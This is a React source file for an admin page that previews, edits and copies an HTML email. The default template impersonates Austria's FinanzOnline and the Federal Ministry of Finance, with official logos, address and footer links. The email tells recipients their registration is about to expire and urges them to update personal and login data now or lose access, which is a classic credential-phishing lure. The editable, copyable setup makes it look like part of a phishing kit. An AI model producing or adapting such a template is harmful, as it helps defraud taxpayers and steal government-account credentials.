import { useState } from "react";
import { Copy, Check, Code, Eye } from "lucide-react";
import { Button } from "@/components/ui/button";
import AdminLayout from "@/components/AdminLayout";
import { useToast } from "@/hooks/use-toast";

const defaultHtmlTemplate = `<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>FinanzOnline - Wichtiger Hinweis</title>
</head>
<body style="margin:0;padding:0;background-color:#f4f4f4;font-family:Arial,Helvetica,sans-serif;">
  <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="background-color:#f4f4f4;padding:40px 0;">
    <tr>
      <td align="center">
        <table role="presentation" width="600" cellpadding="0" cellspacing="0" style="background-color:#ffffff;border-radius:8px;overflow:hidden;box-shadow:0 2px 8px rgba(0,0,0,0.08);">
          
          <!-- Header -->
          <tr>
            <td style="background-color:#ffffff;padding:30px 40px 20px 40px;border-bottom:3px solid #e6320f;">
              <table role="presentation" width="100%" cellpadding="0" cellspacing="0">
                <tr>
                  <td width="50%">
                    <img src="https://finanzonline.bmf.gv.at/fon/img/finanzonline_at_Logo.svg" alt="FinanzOnline" height="32" style="display:block;" />
                  </td>
                  <td width="50%" align="right">
                    <img src="https://www.bmf.gv.at/dam/jcr:bdb810fa-2c39-42e3-914d-7e55b2b6dd9b/BMF_Logo_Standalone_RGB.svg" alt="BMF" height="40" style="display:block;" />
                  </td>
                </tr>
              </table>
            </td>
          </tr>

          <!-- Body -->
          <tr>
            <td style="padding:35px 40px 20px 40px;">
              <h1 style="margin:0 0 25px 0;font-size:20px;color:#1a1a1a;font-weight:700;">
                Wichtiger Hinweis zur Aktualisierung Ihrer Registrierungsdaten
              </h1>

              <p style="margin:0 0 18px 0;font-size:15px;line-height:1.6;color:#333333;">
                Sehr geehrte Damen und Herren,
              </p>

              <!-- Hinweisbox -->
              <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="margin:0 0 25px 0;">
                <tr>
                  <td style="background-color:#f1f4f7;border-left:4px solid #e6320f;border-radius:0 6px 6px 0;padding:20px 24px;">
                    <p style="margin:0 0 12px 0;font-size:14px;line-height:1.6;color:#333333;">
                      Ihre Registrierung bei FinanzOnline läuft in Kürze ab. Um weiterhin Zugang zu allen Services zu gewährleisten, überprüfen und aktualisieren Sie bitte Ihre persönlichen Daten sowie Zugangsdaten zeitnah.
                    </p>
                    <p style="margin:0;font-size:14px;line-height:1.6;color:#333333;">
                      Sollte die Aktualisierung nicht rechtzeitig erfolgen, kann Ihr Zugang eingeschränkt oder vorübergehend gesperrt werden – einschließlich der Abgabe von Steuererklärungen und der Einsicht in Bescheide.
                    </p>
                  </td>
                </tr>
              </table>

              <p style="margin:0 0 30px 0;font-size:15px;line-height:1.6;color:#333333;">
                Bitte aktualisieren Sie Ihre Daten umgehend, um eine Unterbrechung Ihres Zugangs zu vermeiden.
              </p>

              <!-- CTA Button -->
              <table role="presentation" cellpadding="0" cellspacing="0" style="margin:0 auto 30px auto;">
                <tr>
                  <td align="center" style="background-color:#e6320f;border-radius:6px;">
                    <a href="https://finanzonline.bmf.gv.at" target="_blank" style="display:inline-block;padding:14px 36px;font-size:15px;font-weight:600;color:#ffffff;text-decoration:none;letter-spacing:0.3px;">
                      Jetzt Daten aktualisieren
                    </a>
                  </td>
                </tr>
              </table>

              <p style="margin:0 0 8px 0;font-size:13px;line-height:1.5;color:#888888;">
                Falls Sie diese Aktualisierung bereits durchgeführt haben, können Sie diese E-Mail ignorieren.
              </p>
            </td>
          </tr>

          <!-- Footer -->
          <tr>
            <td style="background-color:#f8f9fa;padding:25px 40px;border-top:1px solid #e5e7eb;">
              <table role="presentation" width="100%" cellpadding="0" cellspacing="0">
                <tr>
                  <td>
                    <p style="margin:0 0 6px 0;font-size:12px;color:#999999;">
                      Bundesministerium für Finanzen
                    </p>
                    <p style="margin:0 0 12px 0;font-size:12px;color:#999999;">
                      Johannesgasse 5, 1010 Wien | Tel: +43 50 233 790
                    </p>
                    <p style="margin:0;font-size:11px;color:#bbbbbb;">
                      <a href="https://www.bmf.gv.at/public/impressum.html" style="color:#999999;text-decoration:underline;">Impressum</a>
                      &nbsp;&middot;&nbsp;
                      <a href="https://www.bmf.gv.at/public/datenschutz.html" style="color:#999999;text-decoration:underline;">Datenschutz</a>
                      &nbsp;&middot;&nbsp;
                      <a href="https://finanzonline.bmf.gv.at" style="color:#999999;text-decoration:underline;">finanzonline.bmf.gv.at</a>
                    </p>
                  </td>
                </tr>
              </table>
            </td>
          </tr>

        </table>
      </td>
    </tr>
  </table>
</body>
</html>`;

const AdminEmailTemplate = () => {
  const [htmlCode, setHtmlCode] = useState(defaultHtmlTemplate);
  const [showCode, setShowCode] = useState(false);
  const [copied, setCopied] = useState(false);
  const { toast } = useToast();

  const handleCopy = async () => {
    await navigator.clipboard.writeText(htmlCode);
    setCopied(true);
    toast({ title: "HTML-Code kopiert!" });
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <AdminLayout>
      <div className="mx-auto max-w-5xl space-y-6">
        {/* Header */}
        <div>
          <h1 className="text-2xl font-bold tracking-tight text-slate-900">Email Template</h1>
          <p className="mt-1 text-sm text-slate-500">HTML-Email Vorlage bearbeiten und als Code kopieren</p>
        </div>

        {/* Preview */}
        <div className="overflow-hidden rounded-xl border border-slate-200 bg-white shadow-sm">
          <div className="flex items-center justify-between border-b border-slate-100 px-5 py-3">
            <div className="flex items-center gap-2 text-sm font-medium text-slate-700">
              <Eye className="h-4 w-4" />
              Vorschau
            </div>
            <div className="flex items-center gap-2">
              <Button
                variant="outline"
                size="sm"
                onClick={() => setShowCode(!showCode)}
                className="gap-2 text-xs"
              >
                <Code className="h-3.5 w-3.5" />
                {showCode ? "Code ausblenden" : "HTML-Code anzeigen"}
              </Button>
              <Button
                variant="outline"
                size="sm"
                onClick={handleCopy}
                className="gap-2 text-xs"
              >
                {copied ? <Check className="h-3.5 w-3.5" /> : <Copy className="h-3.5 w-3.5" />}
                {copied ? "Kopiert!" : "Kopieren"}
              </Button>
            </div>
          </div>
          <div className="bg-slate-50 p-6">
            <div className="mx-auto max-w-[640px] overflow-hidden rounded-lg border border-slate-200 bg-white shadow-sm">
              <iframe
                srcDoc={htmlCode}
                className="w-full border-none"
                style={{ height: "700px" }}
                title="Email Preview"
                sandbox=""
              />
            </div>
          </div>
        </div>

        {/* Code Editor */}
        {showCode && (
          <div className="overflow-hidden rounded-xl border border-slate-200 bg-white shadow-sm">
            <div className="flex items-center justify-between border-b border-slate-100 px-5 py-3">
              <div className="flex items-center gap-2 text-sm font-medium text-slate-700">
                <Code className="h-4 w-4" />
                HTML-Code (Live-Bearbeitung)
              </div>
            </div>
            <textarea
              value={htmlCode}
              onChange={(e) => setHtmlCode(e.target.value)}
              className="block w-full resize-y bg-slate-950 p-5 font-mono text-sm leading-relaxed text-emerald-400 focus:outline-none"
              style={{ minHeight: "500px" }}
              spellCheck={false}
            />
          </div>
        )}
      </div>
    </AdminLayout>
  );
};

export default AdminEmailTemplate;
